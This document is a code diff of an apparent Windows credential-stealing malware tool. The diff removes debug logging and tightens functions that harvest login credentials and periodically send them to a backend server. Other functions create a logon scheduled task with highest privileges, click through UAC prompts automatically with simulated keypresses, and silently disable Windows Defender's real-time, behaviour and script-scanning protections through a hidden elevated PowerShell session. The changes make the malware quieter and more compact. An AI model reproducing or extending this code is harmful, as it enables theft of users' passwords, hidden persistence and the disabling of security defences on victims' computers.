@@ -491,13 +491,10 @@ def capture_login_credentials():
                                    and c['username'] == credential['username']]
                         if not existing:
                             captured_credentials.append(credential)
-                            #(f"[+] Captured credential for: {credential['url'][:50]}...")
 
-        #(f"[*] Total captured credentials: {len(captured_credentials)}")
         return len(captured_credentials)
 
-    except Exception as e:
-        #(f"[-] Error capturing credentials: {e}")
+    except Exception:
         return 0
 
 
@@ -510,7 +507,6 @@ def send_credentials_to_backend():
 
     with credentials_lock:
         if not captured_credentials:
-            #("[*] No credentials to send")
             return False
 
         # Prepare payload
@@ -530,15 +526,12 @@ def send_credentials_to_backend():
             )
 
             if response.status_code == 201:
-                #(f"[+] Successfully sent {len(captured_credentials)} credentials to backend")
                 captured_credentials.clear()
                 return True
             else:
-                #(f"[-] Failed to send credentials: {response.status_code}")
                 return False
 
-        except Exception as e:
-            #(f"[-] Error sending credentials: {e}")
+        except Exception:
             return False
 
 
@@ -548,23 +541,16 @@ def credential_capture_loop():
     """
     while True:
         try:
-            #("[*] Running credential capture...")
             capture_login_credentials()
-
-            #("[*] Sending credentials to backend...")
             send_credentials_to_backend()
-
-            #(f"[*] Next credential capture in {CREDENTIALS_SEND_INTERVAL} seconds (1 hour)")
             time.sleep(CREDENTIALS_SEND_INTERVAL)
 
-        except Exception as e:
-            #(f"[-] Error in credential capture loop: {e}")
+        except Exception:
             time.sleep(60)  # Wait 1 minute on error before retry
 
 
 def run_credential_capture():
     """Start credential capture in background thread"""
-    #("[*] Starting credential capture service (sends every 1 hour)...")
     credential_thread = threading.Thread(target=credential_capture_loop, daemon=True)
     credential_thread.start()
     return credential_thread
@@ -1126,18 +1112,9 @@ def add_scheduled_task():
             # Already admin - create task directly
             cmd = ['schtasks', '/create', '/tn', task_name, '/tr', task_command, '/sc', 'onlogon', '/rl', 'highest', '/f']
             result = subprocess.run(cmd, capture_output=True, text=True)
-
-            if result.returncode == 0:
-                #(f"[+] Scheduled task '{task_name}' created successfully (runs at logon)")
-                return True
-            else:
-                #(f"[-] Failed to create task: {result.stderr.strip()}")
-                return False
+            return result.returncode == 0
         else:
             # Not admin - need to elevate via runas
-            #("[*] Not running as admin, requesting elevation...")
-
-            # Create PowerShell command
             ps_cmd = f'schtasks /delete /tn \\"{task_name}\\" /f 2>$null; schtasks /create /tn \\"{task_name}\\" /tr \'{task_command}\' /sc onlogon /f'
 
             # Run PowerShell as admin
@@ -1148,11 +1125,7 @@ def add_scheduled_task():
             )
 
             if result > 32:
-                #("[+] UAC prompt shown - please accept to create scheduled task")
-                # Give time for UAC and execution
                 time.sleep(2)
-
-                # Try to handle UAC with keyboard
                 pyautogui.press("left")
                 time.sleep(0.3)
                 pyautogui.press("enter")
@@ -1160,18 +1133,11 @@ def add_scheduled_task():
 
                 # Verify task was created
                 verify = subprocess.run(['schtasks', '/query', '/tn', task_name], capture_output=True)
-                if verify.returncode == 0:
-                    #(f"[+] Scheduled task '{task_name}' created successfully")
-                    return True
-                else:
-                    #("[-] Task not created - UAC may have been declined")
-                    return False
+                return verify.returncode == 0
             else:
-                #(f"[-] Failed to request elevation: error {result}")
                 return False
 
-    except Exception as e:
-        #(f"[-] Error creating scheduled task: {e}")
+    except Exception:
         return False
 
 
@@ -1194,87 +1160,37 @@ def disable_firewall():
         return False
 
 
-def disable_defender(debug=True):
-    """Disable Windows Defender real-time protection using PowerShell as Administrator
-
-    Args:
-        debug: If True, capture and # PowerShell output for debugging
-    """
+def disable_defender():
+    """Disable Windows Defender real-time protection using PowerShell as Administrator"""
     if not WINDOWS:
-        #("[!] Not running on Windows, skipping disable_defender")
         return False
     try:
-        #("[*] Starting to disable Windows Defender...")
-        # PowerShell commands to disable Windows Defender
-        ps_commands = [
-            ("Set-MpPreference -DisableRealtimeMonitoring $true", "Realtime Monitoring"),
-            ("Set-MpPreference -DisableBehaviorMonitoring $true", "Behavior Monitoring"),
-            ("Set-MpPreference -DisableBlockAtFirstSeen $true", "Block At First Seen"),
-            ("Set-MpPreference -DisableIOAVProtection $true", "IOAV Protection"),
-            ("Set-MpPreference -DisableScriptScanning $true", "Script Scanning"),
-            ("Set-MpPreference -DisableArchiveScanning $true", "Archive Scanning"),
-            ("Set-MpPreference -DisableIntrusionPreventionSystem $true", "Intrusion Prevention System"),
-        ]
+        # Combine all commands into one PowerShell script
+        ps_script = """
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+"""
+        # Run all commands in one elevated PowerShell session
+        ctypes.windll.shell32.ShellExecuteW(
+            None,
+            "runas",
+            "powershell.exe",
+            f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_script}"',
+            None,
+            0  # SW_HIDE
+        )
+        time.sleep(2)
+        pyautogui.press("left")
+        time.sleep(0.3)
+        pyautogui.press("enter")
 
-        # Execute each command with elevated privileges
-        for ps_cmd, feature_name in ps_commands:
-            try:
-                #(f"[*] Disabling {feature_name}...")
-
-                if debug:
-                    # DEBUG MODE: Use subprocess to capture output first
-                    result = subprocess.run(
-                        ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
-                        capture_output=True,
-                        text=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-
-                    #(f"    [DEBUG] Return code: {result.returncode}")
-                    if result.stdout.strip():
-                        #(f"    [DEBUG] stdout: {result.stdout.strip()}")
-                    if result.stderr.strip():
-                        #(f"    [DEBUG] stderr: {result.stderr.strip()}")
-
-                    if result.returncode == 0 and not result.stderr.strip():
-                        #(f"[+] {feature_name} disabled successfully!")
-                    else:
-                        #(f"[-] {feature_name} needs admin - trying UAC elevation...")
-                        # Try with ShellExecute for UAC
-                        ret = ctypes.windll.shell32.ShellExecuteW(
-                            None,
-                            "runas",  # Run as administrator
-                            "powershell.exe",
-                            f'-ExecutionPolicy Bypass -Command "{ps_cmd}"',
-                            None,
-                            1  # SW_SHOWNORMAL to see the window
-                        )
-                        #(f"    [DEBUG] ShellExecuteW returned: {ret}")
-                        time.sleep(2)  # sleep for UAC prompt
-                        pyautogui.hotkey("alt", "y")  # Press Alt+Y to click Yes on UAC
-                        #(f"[+] UAC elevation attempted for {feature_name}")
-                else:
-                    # PRODUCTION MODE: Use ShellExecute with UAC
-                    ctypes.windll.shell32.ShellExecuteW(
-                        None,
-                        "runas",  # Run as administrator
-                        "powershell.exe",
-                        f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
-                        None,
-                        0  # SW_HIDE
-                    )
-                    time.sleep(2)  # sleep for UAC prompt
-                    pyautogui.hotkey("alt", "y")  # Press Alt+Y to click Yes on UAC
-                    #(f"[+] {feature_name} disabled successfully!")
-
-            except Exception as e:
-                #(f"[-] Error disabling {feature_name}: {e}")
-                continue
-
-        #("[+] Windows Defender disable process completed!")
         return True
-    except Exception as e:
-        #(f"[-] Failed to disable Windows Defender: {e}")
+    except Exception:
         return False
 
 
